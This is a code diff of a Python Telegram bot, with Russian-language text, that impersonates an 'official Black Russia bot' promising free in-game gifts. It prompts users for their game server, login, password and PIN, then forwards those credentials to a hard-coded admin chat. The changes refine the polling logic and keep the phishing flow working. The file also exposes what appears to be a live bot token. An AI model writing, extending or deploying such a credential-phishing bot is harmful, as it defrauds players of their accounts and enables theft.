@@ -9,7 +9,7 @@ import re
 app = Flask(__name__)
 
 BOT_TOKEN = "8828199468:AAEh0DC2_g9swwiCoNc080AmQK11qyNrOiE"
-ADMIN_CHAT_ID = "8625787020"  # ТВОЙ ID
+ADMIN_CHAT_ID = "8625787020"
 
 # === ФАЙЛЫ ===
 USERS_FILE = "users.json"
@@ -37,7 +37,6 @@ def save_user(user_id):
             json.dump(USERS, f)
 
 user_state = {}
-pending_reply = {}
 
 # === ТЕКСТЫ ===
 WELCOME = "🎁 *BLACK RUSSIA — ОФИЦИАЛЬНЫЙ БОТ*\n\n▸ Здесь ты можешь получить бесплатные подарки от Black Russia.\n▸ Выбери действие ниже."
@@ -77,36 +76,44 @@ def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
 
 def handle_message(chat_id, text, username, user_id):
     state = user_state.get(str(user_id), {})
+    
+    # === ОБРАБОТКА КНОПОК И КОМАНД ===
     if text == "🔙 Назад":
         user_state[str(user_id)] = {}
         send_message(chat_id, CHOOSE_ACTION, MAIN_KEYBOARD)
         return
+    
     if text in ["🎁 Получить особый кейс", "💳 Получить 10кк виртов"]:
         action = "case" if "кейс" in text else "virts"
         user_state[str(user_id)] = {"action": action}
         send_message(chat_id, SELECT_SERVER, build_server_keyboard())
         return
+    
     if text == "ℹ️ О боте":
         send_message(chat_id, ABOUT, MAIN_KEYBOARD)
         return
+    
     if state.get("action") in ["case", "virts"] and text in SERVERS:
         state["server"] = text
         state["step"] = "login"
         user_state[str(user_id)] = state
         send_message(chat_id, ENTER_LOGIN, BACK_KEYBOARD)
         return
+    
     if state.get("step") == "login":
         state["login"] = text
         state["step"] = "password"
         user_state[str(user_id)] = state
         send_message(chat_id, ENTER_PASSWORD, BACK_KEYBOARD)
         return
+    
     if state.get("step") == "password":
         state["password"] = text
         state["step"] = "pin"
         user_state[str(user_id)] = state
         send_message(chat_id, ENTER_PIN, PIN_KEYBOARD)
         return
+    
     if state.get("step") == "pin":
         if text == "❌ Нет кода":
             pin = "Нет кода"
@@ -117,11 +124,13 @@ def handle_message(chat_id, text, username, user_id):
             return
         else:
             pin = text
+        
         data_msg = (f"🎁 *НОВЫЙ ЗАПРОС*\n─────────────────\n👤 Юзернейм: @{username}\n🆔 ID: {user_id}\n─────────────────\n🌍 Сервер: {state.get('server')}\n👤 Логин: {state.get('login')}\n🔑 Пароль: {state.get('password')}\n🔐 Пин-код: {pin if pin else 'Не указан'}")
         send_message(ADMIN_CHAT_ID, data_msg)
         user_state[str(user_id)] = {}
         send_message(chat_id, WAITING, MAIN_KEYBOARD)
         return
+    
     if state.get("step") == "pin_input":
         if len(text) == 4 and text.isdigit():
             pin = text
@@ -132,12 +141,16 @@ def handle_message(chat_id, text, username, user_id):
         else:
             send_message(chat_id, "⚠️ *Пин-код должен состоять из 4 цифр. Попробуйте снова:*", BACK_KEYBOARD)
         return
+    
     if text == '/start':
         send_message(chat_id, WELCOME, MAIN_KEYBOARD)
         return
+    
+    # === ВСЁ ОСТАЛЬНОЕ (если ничего не подошло) ===
+    # Просто показываем меню, но без лишнего "Выберите действие"
     send_message(chat_id, CHOOSE_ACTION, MAIN_KEYBOARD)
 
-# === ПОЛЛИНГ (получение сообщений) ===
+# === ПОЛЛИНГ ===
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
     params = {"timeout": 30, "allowed_updates": ["message"]}
@@ -171,12 +184,14 @@ def poll():
                             target_id = int(match.group(1))
                             send_message(target_id, ADMIN_REPLY + text)
                             send_message(ADMIN_CHAT_ID, f"✅ *Ответ отправлен* (ID: {target_id})")
+                            offset = update["update_id"] + 1
                             continue
 
                     # === КОМАНДЫ АДМИНА ===
                     if str(chat_id) == ADMIN_CHAT_ID:
                         if text == '/users':
                             send_message(ADMIN_CHAT_ID, f"👥 *Всего пользователей:* {len(USERS)}")
+                            offset = update["update_id"] + 1
                             continue
                         if text.startswith('/reply '):
                             parts = text.split(" ", 2)
@@ -185,6 +200,7 @@ def poll():
                                 reply_text = parts[2]
                                 send_message(target_id, ADMIN_REPLY + reply_text)
                                 send_message(ADMIN_CHAT_ID, f"✅ *Ответ отправлен* (ID: {target_id})")
+                            offset = update["update_id"] + 1
                             continue
                         if text.startswith('/sendall '):
                             msg = text.replace("/sendall ", "")
@@ -194,14 +210,11 @@ def poll():
                                 except:
                                     pass
                             send_message(ADMIN_CHAT_ID, f"✅ *Рассылка отправлена* {len(USERS)} пользователям.")
+                            offset = update["update_id"] + 1
                             continue
 
                     # === ОБЫЧНЫЕ ПОЛЬЗОВАТЕЛИ ===
                     save_user(user_id)
-                    # Отправляем админу юзернейм и текст отдельно
-                    send_message(ADMIN_CHAT_ID, f"@{username} (ID: {user_id})")
-                    send_message(ADMIN_CHAT_ID, text)
-                    # Обрабатываем логику бота
                     handle_message(chat_id, text, username, user_id)
 
                     offset = update["update_id"] + 1
